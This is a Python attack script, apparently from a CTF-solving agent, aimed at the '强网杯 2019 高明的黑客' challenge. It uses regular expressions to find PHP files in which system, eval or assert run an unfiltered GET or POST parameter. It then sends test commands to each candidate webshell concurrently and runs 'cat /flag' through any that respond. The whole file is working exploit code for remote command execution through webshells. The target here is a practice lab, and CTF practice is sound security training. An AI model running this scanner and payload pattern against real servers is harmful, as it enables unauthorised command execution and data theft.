#!/usr/bin/env python3
"""
分析PHP文件，找出真正可利用的webshell
关键：参数在调用危险函数前没有被硬编码覆盖
"""
import os
import re
import requests
import concurrent.futures
from urllib.parse import urljoin

BASE_URL = "http://1ce748b6-be52-42cc-b4f8-e34ed99fd3d7.node5.buuoj.cn:81/"
SRC_DIR = "/home/lls/data/ctf-agent/challenges/154_强网杯_2019_高明的黑客/src"

def find_potential_shells(filepath):
    """分析单个PHP文件，找出潜在的可利用点"""
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    results = []
    filename = os.path.basename(filepath)

    # 查找 system/eval/assert 等危险函数调用
    patterns = [
        (r'system\s*\(\s*\$_GET\[[\'"](\w+)[\'"]\]', 'GET', 'system'),
        (r'system\s*\(\s*\$_POST\[[\'"](\w+)[\'"]\]', 'POST', 'system'),
        (r'eval\s*\(\s*\$_GET\[[\'"](\w+)[\'"]\]', 'GET', 'eval'),
        (r'eval\s*\(\s*\$_POST\[[\'"](\w+)[\'"]\]', 'POST', 'eval'),
        (r'assert\s*\(\s*\$_GET\[[\'"](\w+)[\'"]\]', 'GET', 'assert'),
        (r'assert\s*\(\s*\$_POST\[[\'"](\w+)[\'"]\]', 'POST', 'assert'),
    ]

    for pattern, method, func in patterns:
        matches = re.finditer(pattern, content)
        for match in matches:
            param_name = match.group(1)
            func_pos = match.start()
            
            # 检查参数是否在调用前被硬编码覆盖
            assign_pattern = rf"\$_{method}\[[\'\"]{re.escape(param_name)}[\'\"]\]\s*=\s*[^;]+;"
            assign_before = [a for a in re.finditer(assign_pattern, content) if a.start() < func_pos]

            if not assign_before:
                results.append({
                    'file': filename,
                    'param': param_name,
                    'method': method,
                    'func': func,
                })

    return results

def test_shell(filename, param, method):
    """测试shell是否可用"""
    url = urljoin(BASE_URL, f"src/{filename}")
    try:
        if method == 'GET':
            resp = requests.get(url, params={param: 'echo "SHELL_TEST_OK";'}, timeout=5)
        else:
            resp = requests.post(url, data={param: 'echo "SHELL_TEST_OK";'}, timeout=5)

        if 'SHELL_TEST_OK' in resp.text:
            return True, filename, param, method
    except:
        pass
    return False, filename, param, method

def main():
    php_files = [os.path.join(SRC_DIR, f) for f in os.listdir(SRC_DIR) if f.endswith('.php')]
    print(f"[*] 找到 {len(php_files)} 个PHP文件")

    all_potentials = []
    for filepath in php_files:
        results = find_potential_shells(filepath)
        all_potentials.extend(results)

    print(f"[*] 找到 {len(all_potentials)} 个潜在利用点")

    print("[*] 开始测试...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for r in all_potentials:
            futures.append(executor.submit(test_shell, r['file'], r['param'], r['method']))

        for future in concurrent.futures.as_completed(futures):
            success, filename, param, method = future.result()
            if success:
                print(f"[+] 找到可用shell: {filename} -> {method}[{param}]")
                url = urljoin(BASE_URL, f"src/{filename}")
                if method == 'GET':
                    resp = requests.get(url, params={param: 'cat /flag'}, timeout=10)
                else:
                    resp = requests.post(url, data={param: 'cat /flag'}, timeout=10)

                if 'flag{' in resp.text:
                    print(f"[+] FLAG: {resp.text}")
                    return

if __name__ == '__main__':
    main()
